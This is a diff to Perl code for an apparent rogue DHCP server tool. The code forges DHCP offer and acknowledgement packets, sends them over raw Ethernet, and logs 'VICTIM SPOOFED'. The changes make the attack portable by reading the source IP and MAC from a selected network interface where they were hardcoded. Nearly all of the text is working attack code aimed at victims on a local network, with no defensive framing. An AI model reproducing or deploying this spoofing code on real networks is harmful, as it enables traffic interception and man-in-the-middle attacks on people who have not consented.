@@ -1,6 +1,8 @@
+#Xid, IP To assign, Server IP, DHCP Message, Client MAC
 sub ForgeDHCPServer
 {
     my $dhcp_packet = Net::DHCP::Packet->new(
+        'Op' => 2,
         'Chaddr' => $_[4],
         'Xid' => $_[0],
         'Yiaddr' => $_[1],
@@ -16,25 +18,22 @@ sub ForgeDHCPServer
     
     if ($_[3] == 5)
     {
-        print "/!\\ DHCPACK SENT ! VICTIM SPOOFED [Transaction ID : $_[0]] /!\\\n";
+        AddLogInfo("/!\\ DHCPACK SENT ! VICTIM SPOOFED [Transaction ID : $_[0] - IP : $_[1]] /!\\\n");
     }
     elsif ($_[3] == 2)
     {
-        print "/!\\ PREAUTH OFFER SENT ! /!\\\n";
+        AddLogInfo("/!\\ PREAUTH OFFER SENT ! /!\\\n");
     }
     SendDHCPResponse($_[1],$dhcp_packet,$_[4]);
 }
 
-sub MacFormat
-{
-    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
-}
 
 sub SendDHCPResponse
 {
+    my $interface = GetSelectedInterface();
     my $packet = Net::RawIP->new({
                           ip => {
-                                saddr => '192.168.0.1',
+                                saddr => get_interface_address($interface),
                                 daddr => $_[0],
                                 },
 
@@ -44,8 +43,10 @@ sub SendDHCPResponse
                                 data => $_[1]->serialize(),
                                 },
                           });
-    $packet->ethnew("p5p1");
-    $packet->ethset(source => 'c8:60:00:42:21:3c',dest => MacFormat($_[2]));    
+    $packet->ethnew($interface);
+    print STDERR ("SRC : " .get_interface_mac($interface) ."\n");
+    print STDERR ("DST : " .MacFormat($_[2]) ."\n");
+    $packet->ethset(source => get_interface_mac($interface),dest => MacFormat($_[2]));    
     $packet->ethsend;
 }
 
